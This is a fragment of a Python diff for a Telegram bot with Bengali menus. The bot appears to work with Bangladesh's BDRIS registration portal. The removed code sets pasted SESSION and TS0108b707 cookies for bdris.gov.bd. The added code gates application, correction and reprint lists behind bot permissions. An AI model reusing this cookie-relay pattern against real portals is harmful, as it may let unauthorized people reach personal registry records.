-        bot.send_message(cid, "👥 ইউজার প্যানেল:", reply_markup=markup)
+    # ---- Dashboard ----
+    elif t in ("🏠 Dashboard", "/start"):
+        safe_send(
+            cid, "🏠 ড্যাশবোর্ড — মেনু থেকে অপশন বেছে নিন।",
+            reply_markup=generate_main_menu(cid, uid)
+        )
 
-def admin_login_logic(m):
-    sid, tsid = extract_sid_tsid(m.text.strip())
-    u_sess = get_session(m.chat.id)
-    if sid:
-        u_sess["req_session"].cookies.set("SESSION", sid, domain='bdris.gov.bd')
-        u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
-        u_sess["is_alive"] = True
-        save_session_to_db(m.chat.id, u_sess)
-        bot.send_message(m.chat.id, "✅ এডমিন সেশন সেট হয়েছে!", reply_markup=generate_main_menu(m.chat.id))
-    else: bot.send_message(m.chat.id, "❌ কুকি ভুল।")
+    # ---- Category lists (requires login) ----
+    elif t == "📋 Applications" and u_sess["is_alive"] and (perms.get("apps") or uid == ADMIN_ID):
+        handle_category_init(m, 'apps')
+    elif t == "📝 Correction" and u_sess["is_alive"] and (perms.get("corr") or uid == ADMIN_ID):
+        handle_category_init(m, 'corr')
+    elif t == "🔄 Reprint" and u_sess["is_alive"] and (perms.get("repr") or uid == ADMIN_ID):
+        handle_category_init(m, 'repr')
+
+    # ---- Not logged in guard ----
+    elif t in ("📋 Applications", "📝 Correction", "🔄 Reprint"):
+        safe_send(cid, "❌ এই ফিচার ব্যবহার করতে আগে লগইন করুন।")
+
+    # ---- Fallback ----
+    else:
+        safe_send(
+            cid, "🚀 বিডিআরআইএস মাস্টার বট। মেনু থেকে অপশন বেছে নিন।",
+            reply_markup=generate_main_menu(cid, uid)
+        )
+
+# ==========================================
+# ১২. এক্সেকিউশন
+# ==========================================
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "BDRIS BOT ACTIVE"
 
 if __name__ == "__main__":
-    Thread(target=keep_sessions_alive, daemon=True).start()
-    Thread(target=lambda: Flask('').run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))).start()
-    bot.infinity_polling()
+    Thread(target=keep_sessions_alive_and_cleanup, daemon=True).start()
+    Thread(
+        target=lambda: app.run(host='0.0.0.0', port=10000, use_reloader=False),
+        daemon=True
+    ).start()
+    logging.info("🚀 Bot is Polling...")
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=30)
+        except Exception as e:
+            logging.error(f"Restarting... {e}")
+            time.sleep(5)
